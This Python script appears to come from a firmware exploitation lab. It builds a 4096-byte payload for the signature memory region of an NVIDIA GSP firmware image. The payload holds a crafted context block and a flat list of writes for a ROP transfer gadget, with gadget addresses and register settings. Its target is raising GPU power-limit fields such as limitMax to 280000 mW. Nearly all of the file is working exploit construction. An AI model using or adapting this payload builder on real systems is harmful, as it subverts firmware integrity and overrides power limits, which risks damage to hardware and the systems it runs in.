#!/usr/bin/env python3
"""
4.42 TÂCHE 2 — the transfer-list BUILDER: {value, target} -> the flat
u64 payload laid into the signature-memdesc image (4096 B, PROVEN size
of .fwsignature_ga10x in OUR gsp_ga10x.bin container).

The mechanism banked this pass (PROVEN, bootloader.asm lines 976-1042):
  - the list = a FLAT u64 array; the walk pointer lives at sp+0x8 of the
    transfer frame; each iteration: payload = [walk]; walk += 8; [a1] =
    payload. NO next-pointers in the data (the {value, next-ptr} 16-B
    hypothesis FALSIFIED: addi a6,a5,0x8 = the fixed stride).
  - the GADGET mode (enter 0x100b3e): write #1 = [a1] (our register =
    an absolute address); writes #2..N = [a4+0x498] + [a4+0x488]*8 with
    the slot auto-advancing (the crafted-context scatter), bounded by
    a3 iterations, a0 = ~0 keeps every iteration on the RAW path (the
    signature/rdtime tails skipped).
  - the FULL-LOOP mode (enter 0x100aec): n = a0+1 entries = (n-2) raw +
    1 signature ((last-0x16d000)&0xFFFF | magic<<56 | n<<48) + 1 rdtime
    (1 tick = 1 ns, 4.34); the slot-0 count bumped by n at the end.

Encoding PROVEN: mW u32 LE (the transport clientLimit mW, 4.24 §2.2;
the capture triplet {100000,240000,250000}, runbook-426 §7.2).
280000 mW = 0x000445C0 ; 240000 mW = 0x0003A980.

The deliverable table (the mission's {value, target}):
  E1  obj+0x108 (the params-struct frame) : u64 0x000445C00003A980 =
      {limitRated 240000 kept, limitMax 280000} — ALIGNED u64 (obj is
      8-aligned; 0x108 % 8 == 0). PER 4.38 §1.3 the params lane = a
      userspace template never firmware-filled -> the entry = the
      MECHANISM demo; the policy effect = HYPOTHESIS-DEAD lane.
  E2  obj+0x660 (the policy-object frame, the ONE statically-proven
      policy field, 4.20 §4): u32 0x000445C0 = the recomputation
      result. The u64 write covers {0x660,0x664}; the 0x664 neighbor =
      UNKNOWN (the risk named; the RM recomputation rewrites it).
  The runtime bases (the params buffer, the object pointer at
  state+0x4E98) = RUNTIME values — the list carries {value, target}
  pairs whose targets are resolved by the ROP chain before the transfer
  gadget runs (the ld gadget = the 4.40 inventory, the future work).
"""
import json, struct

MEMDESC_SIZE = 0x1000          # 4096 B — PROVEN (.fwsignature_ga10x)
SLOT = 8
CAP_ENTRIES = MEMDESC_SIZE // SLOT   # 512 u64 slots MAX (flat list)

LIMIT_RATED_MW = 240000
LIMIT_MAX_MW_NEW = 280000
LIMIT_MAX_MW_STOCK = 250000

def enc_u64(v):
    return struct.pack("<Q", v & (1 << 64) - 1)

def entry(value, note):
    return {"value_hex": f"0x{value:016x}", "note": note}

# ------------------------------------------------------------------
# the {value, target} TABLE (the mission deliverable)
# ------------------------------------------------------------------
TABLE = {
    "encoding": "mW u32 LE (PROVEN: transport clientLimit mW 4.24; capture triplet runbook-426 7.2)",
    "entries": [
        {
            "id": "E1",
            "frame": "the 0x2080d031 params struct (1544 B)",
            "target": "params+0x108",
            "alignment": "8-aligned if params is 8-aligned (0x108%8==0)",
            "value_u64": "0x000445C00003A980",
            "u32_split": {
                "+0x108 limitRated": f"{LIMIT_RATED_MW} (kept)",
                "+0x10c limitMax": f"{LIMIT_MAX_MW_NEW} (0x000445C0)",
            },
            "evidence": "4.38 1.3 (the offsets) + the loop decode (this pass)",
            "verdict": "MECHANISM-DEMO — the lane = userspace template never firmware-filled (4.38 1.3 verdict), the policy effect = HYPOTHESIS",
        },
        {
            "id": "E2",
            "frame": "the EDPp policy object (0x6d0, ptr at state+0x4E98)",
            "target": "obj+0x660",
            "alignment": "8-aligned (heap object; 0x660%8==0)",
            "value_u64": "0x000445C000000000  (the low u32 = the payload; the 0x664 neighbor = UNKNOWN)",
            "u32_split": {
                "+0x660 recompute result": f"{LIMIT_MAX_MW_NEW} (0x000445C0)",
                "+0x664 neighbor": "UNKNOWN — clobber risk named",
            },
            "evidence": "4.20 4 (sw a5,0x660(s6) = the recomputation store)",
            "verdict": "PRIMARY RM-SIDE FIELD — the recomputation worker rewrites it on the next pass (the write = volatile unless the recompute is neutered; the risk card)",
        },
        {
            "id": "E3",
            "frame": "the six-limit u32s as FOUR aligned u64 writes (params frame)",
            "target": "params+0x100 / +0x108 / +0x110 / +0x118",
            "alignment": "0x100,0x108,0x110,0x118 all 8-aligned",
            "value_u64": [
                "0x????????000186A0  (+0x100 unknown | limitMin 100000)",
                "0x000445C00003A980  (limitRated 240000 | limitMax 280000)",
                "0x????????????????  (limitCurr, limitBattRated — RUNTIME values, not inventable)",
                "0x????????????????  (limitBattMax, +0x11c unknown)",
            ],
            "u32_split": {
                "+0x104 limitMin": "100000",
                "+0x108 limitRated": "240000",
                "+0x10c limitMax": "280000",
                "+0x110 limitCurr": "RUNTIME",
                "+0x114 limitBattRated": "RUNTIME",
                "+0x118 limitBattMax": "RUNTIME",
            },
            "evidence": "4.38 1.3",
            "verdict": "FULL-TEMPLATE CARD — only E3[1] is statically constructible; the rest need the runtime read (the honest boundary)",
        },
    ],
    "misalignment_note": "the u32 limitMin@0x104 sits at 4 mod 8: a u64 store at params+0x104 = MISALIGNED (the RV64 trap risk) — the aligned u64 at +0x100 carries it at the cost of clobbering +0x100..0x103 (unknown). The scatter stride = 8 B ALWAYS (slot*8), the base itself carries the phase.",
}

# ------------------------------------------------------------------
# the PAYLOAD builder — the flat u64 list laid into the memdesc image
# ------------------------------------------------------------------
def build_payload(entries, slot0=0, ctx_slot0=0, ctx_capacity=0x400, ctx_dest=0):
    """entries = [(value_u64, note)] — the RAW list the walk consumes.

    The payload layout (the memdesc image, 4096 B):
      [0x000] the crafted ctx block: +0x488 slot0 / +0x490 capacity /
              +0x498 dest — placed so a4 = payload_base works: the ctx
              fields = AT payload_base+0x488.. (the a4 = the payload
              base = the stack address of the payload, known only at
              runtime — the builder emits the RELATIVE plan; the ROP
              sets a4 = the runtime payload address).
      [0x500] the list head: the u64 entries, the walk = &list[0].
    Returns (bytes, plan).
    """
    assert len(entries) <= (MEMDESC_SIZE - 0x500) // SLOT, "list overflow"
    img = bytearray(b"\xFF" * MEMDESC_SIZE)   # the stock signature fill = 0xFF (the campaign's staging)
    plan = {"ctx": {}, "list_offset": 0x500, "entries": []}
    # the crafted ctx fields (a4 = payload_base)
    img[0x488:0x490] = enc_u64(ctx_slot0)        # +0x488 slot
    img[0x490:0x498] = enc_u64(ctx_capacity)     # +0x490 capacity
    img[0x498:0x4A0] = enc_u64(ctx_dest)         # +0x498 dest base
    img[0x4A0:0x4A1] = bytes([0x08])             # +0x4a0 magic (the setup's value, li a2,0x8)
    plan["ctx"] = {"slot0": ctx_slot0, "capacity": ctx_capacity, "dest": hex(ctx_dest), "magic": 8}
    # the list
    off = 0x500
    for v, note in entries:
        img[off:off + 8] = enc_u64(v)
        plan["entries"].append({"off": off, "value_hex": f"0x{v:016x}", "note": note})
        off += 8
    return bytes(img), plan

# the demo scenario: E1 (the aligned params+0x108 pair write) x3 slots
E1_VALUE = 0x000445C00003A980
payload, plan = build_payload([
    (E1_VALUE, "E1 -> the first write lands on [a1] (the register = the ROP-resolved params+0x108)"),
    (E1_VALUE, "the scatter slot1 -> [ctx.dest + (slot0+1)*8]"),
    (E1_VALUE, "the scatter slot2 -> [ctx.dest + (slot0+2)*8]"),
], ctx_slot0=0, ctx_capacity=0x400, ctx_dest=0xDEAD0000)

out = {
    "memdesc_size": MEMDESC_SIZE,
    "capacity_u64_entries": CAP_ENTRIES,
    "entry_stride_bytes": SLOT,
    "table": TABLE,
    "payload_sha256_prefix": __import__("hashlib").sha256(payload).hexdigest()[:16],
    "plan": plan,
    "gadget_mode_registers": {
        "pc_entry": "0x100b3e",
        "a0": "~0 (the RAW path forever — the signature/rdtime tails skipped)",
        "a3": "N (the iteration bound)",
        "a7": "0 (the i start)",
        "a1": "the FIRST target (absolute, register-controlled)",
        "a4": "the payload_base (the crafted ctx at +0x488/+0x490/+0x498)",
        "sp+8": "&list[0] (the walk pointer cell)",
    },
}
with open("lab/jalon411/v442e_transfer_list_build.json", "w") as f:
    json.dump(out, f, indent=2)
with open("lab/jalon411/v442e_payload.bin", "wb") as f:
    f.write(payload)
print(f"[+] payload 4096 B built, sha256 {out['payload_sha256_prefix']}…")
print(f"[+] {len(plan['entries'])} list entries @0x{plan['list_offset']:x}, ctx @0x488")
print("[+] wrote v442e_transfer_list_build.json + v442e_payload.bin")
